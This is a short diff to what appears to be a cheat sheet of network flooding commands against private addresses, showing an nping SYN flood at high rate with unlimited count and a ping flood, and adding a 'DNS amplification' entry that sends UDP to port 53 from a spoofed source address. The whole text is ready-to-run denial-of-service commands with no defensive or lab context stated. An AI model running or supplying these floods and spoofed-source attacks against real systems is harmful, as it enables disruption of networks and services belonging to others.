@@ -11,5 +11,8 @@ sudo nping --tcp -p 80 --flags SYN --rate 10000 --count 0 192.168.1.4
 ICMP:
 ping -f 192.168.1.4
 
+DNS AMPLIFICATION:
+sudo nping --udp -p 53 --data-string "custom-DNS-query-payload" --source-ip 192.168.1.2 --count 100 --rate 1000 192.168.1.3
+
 
 
